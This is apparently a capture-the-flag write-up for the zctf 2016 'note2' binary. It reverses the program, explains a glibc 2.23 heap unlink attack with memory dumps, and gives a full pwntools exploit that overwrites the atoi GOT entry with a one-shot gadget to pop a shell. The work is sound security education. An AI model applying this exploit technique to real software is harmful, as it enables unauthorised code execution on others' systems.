# zctf 2016 note2

Let's see what we are dealing with:

```
$    file note2
note2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=46dca2e49f923813b316f12858e7e0f42e4a82c3, stripped
$    pwn checksec note2
[*] '/home/guyinatuxedo/Desktop/zctf/note2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$    ./libc-2.23.so
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11) stable release version 2.23, by Roland McGrath et al.
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 5.4.0 20160609.
Available extensions:
    crypt add-on version 2.1 by Michael Glad and others
    GNU Libidn by Simon Josefsson
    Native POSIX Threads Library by Ulrich Drepper et al
    BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
$    ./note2
Input your name:
15935728
Input your address:
15935728
1.New note
2.Show  note
3.Edit note
4.Delete note
5.Quit
option--->>
```

So we are dealing with a `64` bit elf binary, with a stack canary and NX (but no RELRO). We also see that we are given a libc version `2.23` (I'm not sure if that is the one originally associated with the challenge, but that is what I will use here). When we run the binary, it prompts us for a name and an address. After that we get a menu where we can make a not, show a not, edit a note, and delete a note.

### Reversing

Looking through the list of functions in Ghidra (or checking the xreferences to certain strings and tracing back where the functions that contain those strings are called) we find this function which acts as the menu:

```
void menu(void)

{
  undefined4 uVar1;
 
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  alarm(0x3c);
  puts("Input your name:");
  callRead(&name,0x40,10);
  puts("Input your address:");
  callRead(&address,0x60,10);
LAB_0040101c:
  uVar1 = printMenu();
  switch(uVar1) {
  case 1:
    allocateChunk();
    goto LAB_0040101c;
  case 2:
    showChunk();
    goto LAB_0040101c;
  case 3:
    editChunk();
    goto LAB_0040101c;
  case 4:
    freeChunk();
    goto LAB_0040101c;
  case 5:
    break;
  case 6:
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Bye~");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

So we can see, it prompts us to scan in a name and an address (which correlate to the bss addresses `0x6020e0` and `0x602180`). Let's take a look at the `allocateChunk` function:

```
void allocateChunk(void)

{
  uint size;
  void *ptr;
  ulong uVar1;
 
  if (count < 4) {
    puts("Input the length of the note content:(less than 128)");
    size = getInt();
    if (size < 0x81) {
      ptr = malloc((ulong)size);
      puts("Input the note content:");
      callRead(ptr,(ulong)size,10,(ulong)size);
      FUN_00400b10(ptr);
      *(void **)(&pointers + (ulong)count * 8) = ptr;
      *(ulong *)(&sizes + (ulong)count * 8) = (ulong)size;
      uVar1 = (ulong)count;
      count = count + 1;
      printf("note add success, the id is %d\n",uVar1);
    }
    else {
      puts("Too long");
    }
  }
  else {
    puts("note lists are full");
  }
  return;
}
```

So we can see that we get to specify the size of the chunk that is malloced, however it can't be greater than `0x81` bytes. After that It will allow us to scan in data into that buffer. After that it will save the pointer to the malloced chunk in the array `pointers` (stored in the bss address `0x602120`). It also stores the size of the chunk in the bss array `sizes` at `0x602140`. We also see that it keeps a count of how many chunks have been allocated with the bss integer `count` at `0x602160` (and we can only allocate `4` chunks). Also through trial and error, we see that with this we get a heap overflow bug. Next we take a look at the `showChunk` function:

```
void showChunk(void)

{
  int iVar1;
 
  puts("Input the id of the note:");
  iVar1 = getInt();
  if (((-1 < iVar1) && (iVar1 < 4)) && (*(long *)(&pointers + (long)iVar1 * 8) != 0)) {
    printf("Content is %s\n",*(undefined8 *)(&pointers + (long)iVar1 * 8));
  }
  return;
}
```

So we can see here, it prompts us for an index for the `pointers` array. If it passed a check, it will print the contents of the chunk using `printf`. Next up we have the `editChunk` function:

```
void editChunk(void)

{
  char *__src;
  long lVar1;
  undefined8 *puVar2;
  int iVar3;
  size_t sVar4;
  long in_FS_OFFSET;
  char local_100 [128];
  undefined8 *local_80;
  long canary;
 
  canary = *(long *)(in_FS_OFFSET + 0x28);
  if (count == 0) {
    puts("Please add a note!");
  }
  else {
    puts("Input the id of the note:");
    iVar3 = getInt();
    if ((-1 < iVar3) && (iVar3 < 4)) {
      __src = *(char **)(&pointers + (long)iVar3 * 8);
      lVar1 = *(long *)(&sizes + (long)iVar3 * 8);
      if (__src == (char *)0x0) {
        puts("note has been deleted");
      }
      else {
        puts("do you want to overwrite or append?[1.overwrite/2.append]");
        iVar3 = getInt();
        if ((iVar3 == 1) || (iVar3 == 2)) {
          if (iVar3 == 1) {
            local_100[0] = '\0';
          }
          else {
            strcpy(local_100,__src);
          }
          local_80 = (undefined8 *)malloc(0xa0);
          *local_80 = 0x6f4377654e656854;
          local_80[1] = 0x3a73746e65746e;
          printf((char *)local_80);
          callRead((long)local_80 + 0xf,0x90,10);
          FUN_00400b10((long)local_80 + 0xf);
          puVar2 = local_80;
          sVar4 = strlen(local_100);
          *(undefined *)((lVar1 - sVar4) + 0xe + (long)puVar2) = 0;
          strncat(local_100,(char *)((long)local_80 + 0xf),0xffffffffffffffff);
          strcpy(__src,local_100);
          free(local_80);
          puts("Edit note success!");
        }
        else {
          puts("Error choice!");
        }
      }
    }
  }
  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

With this function, I didn't really reverse it. Through trial and error, I see that it allows us to edit chunks. I also noticed that there appears to be another bug in this function, however with everything else I didn't need it to get a shell (I was a bit tired from work when I solved this challenge). Next up we have the `freeChunk` function.

```
void freeChunk(void)

{
  int iVar1;
 
  puts("Input the id of the note:");
  iVar1 = getInt();
  if (((-1 < iVar1) && (iVar1 < 4)) && (*(long *)(&pointers + (long)iVar1 * 8) != 0)) {
    free(*(void **)(&pointers + (long)iVar1 * 8));
    *(undefined8 *)(&pointers + (long)iVar1 * 8) = 0;
    *(undefined8 *)(&sizes + (long)iVar1 * 8) = 0;
    puts("delete note success!");
  }
  return;
}
```

So we can see, it prompts us for a chunk index and checks it. If it passes that check, then it will free the chunk. It will also zero out the pointer and the size, so no use after free. Also freeing a chunk doesn't decrement `count`, so we only get four chunks.

## Exploitation

So we have a heap overflow bug, the ability to allocate four chunks, free them and view their contents. Also there is an array which stores all of the heap pointers at `0x602120` (no PIE so that address doesn't change). The first step of our exploit will be a heap unlink attack.

### Heap Unlink

So we will be doing a heap unlink attack. The goal of this will be to write a pointer to a little bit before `pointers` (bss `0x602120`) to the array. That way we can just reference that pointer to edit pointers, and we will effectively be able to read and write what we want to/from memory. This next part explains how a heap unlink attack works, and is pretty similar to the other writeup in this module (feel free to skip these next few parts explanning):

So for our exploitation process, we will be doing an unlink attack (which is viable on older libc versions, think pre-tcache). Unlinking for the heap is the process of removing a chunk from a bin list (in this case for heap consolidation for performance improvement reasons). What this attack will do is give us a write. However there are a lot of restrictions on what we can write and where we can write. Essentially when an unlink happens, it will write pointers to a chunk to fill in the gap of the chunk that was taken out. This is the write that we get. Let's take a look at the code in `malloc.c` to get a bit of an idea:

```
/* Take a chunk off a bin list.  */
static void
unlink_chunk (mstate av, mchunkptr p)
{
  if (chunksize (p) != prev_size (next_chunk (p)))
    malloc_printerr ("corrupted size vs. prev_size");
  mchunkptr fd = p->fd;
  mchunkptr bk = p->bk;
  if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
    malloc_printerr ("corrupted double-linked list");
  fd->bk = bk;
  bk->fd = fd;
if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)
```

So we can see here, what it does is it takes a chunk, and performs some checks on it. If the chunk passess all of the checks, it will write the pointers with `fd->bk = bk`, `bk->fd = fd`. There are essentially three checks that we need to worry about which we will set up a fake chunk for it. In order for this to work, we need a pointer to the malloc chunk which we will be making our fake chunk in stored somewhere we know. All of our heap chunks are stored in the bss starting at `0x602120` (remember no PIE) so we have that requirement met. Next up we will need to setup the fake chunk, which will contain `fwd` and `bk` pointers which on paper should point to the previous and next chunks in the list (since in the unlink the middle chunk gets removed, pointers to the `fwd` and `bk` chunks are written to each other to fill the gap in the list).

So here is a bit of a representation of what's happening. Starting off here are our three chunks that will be a part of the unlink. They are linked via a doubly linked list with `fd` (forward) and `bk` (back) pointers. The only chunk we are actually going to write any data for will be the middle chunk. For this we will allocate two chunks (actual chunks allocated with malloc). These two chunks will need to be stored adjacent in memory (so we can use one to overflow the other). In the first one we will store the fake chunk, and also use it to overflow into the metadata of the second chunk. Then by freeing the second chunk it will trigger the unlink. The second chunk will not store any part of these three chunks.:

```
+----------------+    +----------------+    +----------------+
| BK             |    | P (fake chunk) |    | FD             |
+----------------+    +----------------+    +----------------+
| BK->fd         |    | P->fd          |    | FD->fd         |
+----------------+    +----------------+    +----------------+
| BK->bk         |    | P->bk          |    | FD->bk         |
+----------------+    +----------------+    +----------------+
```

So in order to pass the unlink check for `if (__builtin_expect (fd->bk != p || bk->fd != p, 0))`, the back pointer of the next chunk and the forward pointer of the previous chunk must be equal to the chunk address of our fake chunk. This is why we need a pointer to our heap chunk to be stored in an area of memory that we know and can read from. Since we have that in the PIE, this is fairly easy to set up. We just need to take the address that the pointer to our fake chunk is stored at, and subtract `0x18` from it to setup the `P->FD` pointer. The first `0x10` bytes of the `0x18` is because there are two QWORDS taken up for the heap metadata (like with a lot of heap chunks). The last `0x8` bytes is because with the `FD` chunk, we are worried about the `FD->bk` pointer not the `FD->fd` and the `FD->fd` takes up the first eight bytes of the chunk (so we need to shift it back by eight bytes to get the pointer in the right spot). Coincidentally we need to subtract `0x10` bytes from the pointer to our fake heap chunk for our `P->bk`, since with that chunk we are worried about the `fwd` pointer which is before the back pointer. The values for `FD-fd ` and `BK->bk ` don't matter too much in this case:

```
+----------------+    +----------------+    +----------------+
| BK             |    | P (fake chunk) |    | FD             |
+----------------+    +----------------+    +----------------+
| BK-fd -> P     |    | P-fd  -> FD    |    | FD-fd  -> null |
+----------------+    +----------------+    +----------------+
| BK->bk -> null |    | P->bk -> BK    |  | FD->bk -> P    |
+----------------+    +----------------+    +----------------+
```

There are two more checks we need to worry about. The first is the size check of our fake chunk, which we will cover in a bit when we talk about how exactly we are going to overflow the heap metadata. The third check consists of the `p->fd_nextsize != NULL`. If we can set `p->fd_nextsize` equal to null, that means we will be able to skip most other checks which will save us a lot of time and hassle. Looking at the source code in `malloc.c` (https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#_int_free) we can see it is stored right after the `bk` pointer:

```
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```

So in order to hit that check that way we want, we just need to set the next QWORD after `bk` to be `0x0`.

After that, we will free the second chunk (second chunk that we allocated) which will trigger the unlink, and write a pointer to `BK-fd` and `FD->bk`. In this case it will be a pointer to the fake `FD` chunk, since they will both be writing it to the same location in memory, however that pointer gets written last.

```
+----------------+    +----------------+
| BK             |    | FD             |
+----------------+    +----------------+
| BK-fd -> FD    |    | FD-fd  -> null |
+----------------+    +----------------+
| BK->bk -> null |    | FD->bk -> BK   |
+----------------+    +----------------+
```

Let's talk about how we will be overflowing the heap metadata and constructing the fake chunk. For this we will allocate three chunks. The first will hold our fake chunk for the unlink. The second chunk we will use to overflow the metadata of the third chunk. The third chunk will be the one which we overwrite the heap metadata to point to the fake chunk, and we free it. For the bug I used, I noticed that we can't use any null bytes (except the one at the end of the string) which we need for the fake chunk. That is why I have the second chunk, so I can overwrite the third chunk's metadata while still keeping the chunk intact. Let's take a look at the memory being corrupted. We start off with our three chunks:

```
gef➤  x/4g 0x602120
0x602120:    0x25f5010    0x25f50a0
0x602130:    0x25f50c0    0x0
gef➤  x/50g 0x25f5000
0x25f5000:    0x0    0x91
0x25f5010:    0x0    0xa0
0x25f5020:    0x602108    0x602110
0x25f5030:    0x0    0x0
0x25f5040:    0x0    0x0
0x25f5050:    0x0    0x0
0x25f5060:    0x0    0x0
0x25f5070:    0x0    0x0
0x25f5080:    0x31    0x0
0x25f5090:    0x0    0x21
0x25f50a0:    0x3131313131313131    0x31
0x25f50b0:    0x0    0x91
0x25f50c0:    0x3232323232323232    0x3232323232323232
0x25f50d0:    0x3232323232323232    0x3232323232323232
0x25f50e0:    0x3232323232323232    0x3232323232323232
0x25f50f0:    0x3232323232323232    0x3232323232323232
0x25f5100:    0x3232323232323232    0x3232323232323232
0x25f5110:    0x3232323232323232    0x3232323232323232
0x25f5120:    0x3232323232323232    0x3232323232323232
0x25f5130:    0x3232323232323232    0x32323232323232
0x25f5140:    0x0    0x20ec1
0x25f5150:    0x0    0x0
0x25f5160:    0x0    0x0
0x25f5170:    0x0    0x0
0x25f5180:    0x0    0x0
```

So we can see our fake chunk at `0x25f5010`. We will now free the `0x25f50a0` chunk, and reallocate it to overflow the third chunks metadata. We will set the previous size to `0xa0` to point to our fake chunk, and clear out the previous in use bit:

```
gef➤  x/4g 0x602120
0x602120:    0x25f5010    0x0
0x602130:    0x25f50c0    0x25f50a0
gef➤  x/50g 0x25f5000
0x25f5000:    0x0    0x91
0x25f5010:    0x0    0xa0
0x25f5020:    0x602108    0x602110
0x25f5030:    0x0    0x0
0x25f5040:    0x0    0x0
0x25f5050:    0x0    0x0
0x25f5060:    0x0    0x0
0x25f5070:    0x0    0x0
0x25f5080:    0x31    0x0
0x25f5090:    0x0    0x21
0x25f50a0:    0x3535353535353535    0x3535353535353535
0x25f50b0:    0xa0    0x90
0x25f50c0:    0x3232323232320031    0x3232323232323232
0x25f50d0:    0x3232323232323232    0x3232323232323232
0x25f50e0:    0x3232323232323232    0x3232323232323232
0x25f50f0:    0x3232323232323232    0x3232323232323232
0x25f5100:    0x3232323232323232    0x3232323232323232
0x25f5110:    0x3232323232323232    0x3232323232323232
0x25f5120:    0x3232323232323232    0x3232323232323232
0x25f5130:    0x3232323232323232    0x32323232323232
0x25f5140:    0x0    0x20ec1
0x25f5150:    0x0    0x0
0x25f5160:    0x0    0x0
0x25f5170:    0x0    0x0
0x25f5180:    0x0    0x0
```

So now when we free the third chunk, it will think that the previous chunk is freed and it starts at `0x25f50b0 - 0xa0 = 0x25f5010`. Since we setup our fake chunk to pass the checks, it will unlink our chunk and write the address of `P->fd` (`0x602120 - 0x18 = 0x602108`) to `0x602120`:

```
gef➤  x/4g 0x602120
0x602120:    0x602108    0x0
0x602130:    0x0    0x25f50a0
gef➤  x/50g 0x25f5000
0x25f5000:    0x0    0x91
0x25f5010:    0x0    0x20ff1
0x25f5020:    0x602108    0x602110
0x25f5030:    0x0    0x0
0x25f5040:    0x0    0x0
0x25f5050:    0x0    0x0
0x25f5060:    0x0    0x0
0x25f5070:    0x0    0x0
0x25f5080:    0x31    0x0
0x25f5090:    0x0    0x21
0x25f50a0:    0x3535353535353535    0x3535353535353535
0x25f50b0:    0xa0    0x90
0x25f50c0:    0x3232323232320031    0x3232323232323232
0x25f50d0:    0x3232323232323232    0x3232323232323232
0x25f50e0:    0x3232323232323232    0x3232323232323232
0x25f50f0:    0x3232323232323232    0x3232323232323232
0x25f5100:    0x3232323232323232    0x3232323232323232
0x25f5110:    0x3232323232323232    0x3232323232323232
0x25f5120:    0x3232323232323232    0x3232323232323232
0x25f5130:    0x3232323232323232    0x32323232323232
0x25f5140:    0x0    0x20ec1
0x25f5150:    0x0    0x0
0x25f5160:    0x0    0x0
0x25f5170:    0x0    0x0
0x25f5180:    0x0    0x0
```

Just like that, the unlink was a success. Now we can use the pointer at `0x602120` to edit the array itself and overwrite pointers, than write to or print the data pointed to by those pointers. For this I wrote the got address of `atoi` to `0x602120`, and printed it for a libc infoleak:

```
gef➤  x/4g 0x602120
0x602120:    0x602088    0x0
0x602130:    0x0    0x25f50a0
gef➤  x/g 0x602088
0x602088 <atoi@got.plt>:    0x7f1df5482e80
```

After that, we can just write a oneshot gadget to `atoi`, and when it gets called (which it does throughout the program) we will get a shell. I choose this one since the first few I tried didn't work for some reason (too tired from work to debug it, so I just tried a few other functions).

## Exploit

Putting it all together, we get the following exploit. This exploit was ran on Ubuntu 16.04:

```
from pwn import *

# Establish the target process, binary, and libc
target = process("./note2", env={"LD_PRELOAD":"./libc-2.23.so"})
elf = ELF('note2')
libc = ELF('libc-2.23.so')

# You were expecting a comment, BUT IT WAS ME DIO!
#gdb.attach(target)

# Establish our io functions
def addNote(content, size):
    print target.recvuntil("option--->>")
    target.sendline("1")
    print target.recvuntil("(less than 128)")
    target.sendline(str(size))
    print target.recvuntil("content:")
    target.send(content)

def editNote(index, content, app):
    print target.recvuntil("option--->>")
    target.sendline("3")
    print target.recvuntil("note:")
    target.sendline(str(index))
    print target.recvuntil("2.append]")
    target.sendline(str(app))
    print target.recvuntil("TheNewContents:")
    target.sendline(content)

def deleteNote(index):
    print target.recvuntil("option--->>")
    target.sendline("4")
    print target.recvuntil("note:")
    target.sendline(str(index))

def showNote(index):
    print target.recvuntil("option--->>")
    target.sendline("2")
    print target.recvuntil("note:")
    target.sendline("0")
    print target.recvuntil("Content is ")
    leak = target.recvline().strip("\x0a")
    leak = u64(leak + "\x00"*(8-len(leak)))
    return leak

# Send data for the address / name
# For our exploit, this really doesn't matter (much like Aqua)
target.sendline("15935728")
target.sendline("15935728")


ptr = 0x602120

fakeChunk = ""

fakeChunk += p64(0x0)            # Previous Size
fakeChunk += p64(0xa0)            # Size
fakeChunk += p64(ptr - (0x8*3))        # FD ptr
fakeChunk += p64(ptr - (0x8*2))        # BK ptr
fakeChunk += p64(0x0)            # FD Next Size

# Allocate the heap chunk and store the fake chunk
addNote(fakeChunk, 0x80)

# For me, IO For this challenge was a bit weird. I needed to insert lines like these in order
# for the input the happen properly.
target.sendline("1")

# Add the second chunk, which will free and reallocate for the overflow
addNote("1"*0x8, 00)
target.sendline("1")

# This is the third chunk which we will overflow it's heap metadata to point to the fake chunk as a freed previous chunk
addNote("2"*0x80, 0x80)
target.sendline("1")

# Free the second chunk, reallocate it and overflow the heap metatda's previous size and size
deleteNote(1)

addNote("5"*0x10 + p64(0xa0) + p64(0x90), 0)
target.sendline("1")


# Free the third chunk (with the overwritten heap metadata) to execute the unlink
deleteNote(2)

# Now that the unlink happened, write the got entry address for atoi to the heap pointers array
editNote(0, "6"*24 + p64(elf.got['atoi']), 1)

# Leak the libc address of atoi, calculate our oneshot gadget address
leak = showNote(0)
libcBase = leak - libc.symbols['atoi']
oneShot = libcBase + 0xf02a4

print "libc base: " + hex(libcBase)
print "oneshot gadget: " + hex(oneShot)

# Write over the got entry for atoi with the oneshot gadget
editNote(0, p64(oneShot), 1)

# Send the string "1" to call atoi, call our oneshot gadget and get a shell
target.sendline("1")

target.interactive()
```

When we run it:

```
$    python exploit.py
[+] Starting local process './note2': pid 4270
[*] '/home/guyinatuxedo/Desktop/zctf/note2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/guyinatuxedo/Desktop/zctf/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Input your name:
Input your address:
1.New note
2.Show  note
3.Edit note
4.Delete note
5.Quit
option--->>

Input the length of the note content:(less than 128)

Input the note content:

note add success, the id is 0
1.New note
2.Show  note
3.Edit note
4.Delete note
5.Quit
option--->>

Input the length of the note content:(less than 128)

Input the note content:

note add success, the id is 1
1.New note
2.Show  note
3.Edit note
4.Delete note
5.Quit
option--->>

Input the length of the note content:(less than 128)

Input the note content:

note add success, the id is 2
1.New note
2.Show  note
3.Edit note
4.Delete note
5.Quit
option--->>

1.New note
2.Show  note
3.Edit note
4.Delete note
5.Quit
option--->>
Input the id of the note:

delete note success!
1.New note
2.Show  note
3.Edit note
4.Delete note
5.Quit
option--->>

Input the length of the note content:(less than 128)

Input the note content:

note add success, the id is 3
1.New note
2.Show  note
3.Edit note
4.Delete note
5.Quit
option--->>

Input the id of the note:

delete note success!
1.New note
2.Show  note
3.Edit note
4.Delete note
5.Quit
option--->>

Input the id of the note:

do you want to overwrite or append?[1.overwrite/2.append]

TheNewContents:
Edit note success!
1.New note
2.Show  note
3.Edit note
4.Delete note
5.Quit
option--->>

Input the id of the note:

Content is
libc base: 0x7fa5eca52000
oneshot gadget: 0x7fa5ecb422a4
1.New note
2.Show  note
3.Edit note
4.Delete note
5.Quit
option--->>

Input the id of the note:

do you want to overwrite or append?[1.overwrite/2.append]

TheNewContents:
[*] Switching to interactive mode
Edit note success!
1.New note
2.Show  note
3.Edit note
4.Delete note
5.Quit
option--->>
$ w
 22:20:38 up  1:45,  1 user,  load average: 0.40, 0.38, 0.22
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               20:35    1:45m  1:06   0.19s /sbin/upstart --user
$ ls
core  exploit.py  libc-2.19.so    libc-2.23.so  note2
```

Just like that, we popped a shell!
